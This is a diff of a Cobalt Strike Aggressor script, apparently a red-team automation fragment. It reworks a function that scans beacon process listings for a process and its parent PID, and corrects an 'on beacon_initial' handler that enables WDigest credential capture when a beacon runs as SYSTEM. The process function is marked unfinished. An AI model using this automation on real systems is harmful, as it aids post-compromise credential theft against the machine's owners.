@@ -23,25 +23,26 @@ sub persist {
 };
 
 ## still working on this
-alias listpids {
-    $2 = $whatiwant;
-    blog($1, "what you want is: $2");
+sub listpids {
+    $proc = $2;
+    $gppid = $3;
     bps($1, lambda({
         local('$pid $name $entry'); 
         foreach $entry (split("\n", $2)) {
             ($name, $ppid, $pid, $arch) = split("\\s+", $entry);
-            println($entry);
-            if ($name eq "explorer.exe") {
-                blog($1, "explorer is $pid");
-            }
-            else if ($name eq $whatiwant) {
-                blog($1, "you wanted: $pid");
+            if ($gppid eq "1") {
+                if ($name eq $proc) {
+                    return $ppid;
+                }
+                else {
+                    return $pid;
+                }
             }
         }
     }
 ))};
 
-on becaon_initial {
+on beacon_initial {
   if("SYSTEM" isin beacon_info($1, "user")) {
     say("user is system");
     bwdigest($1);
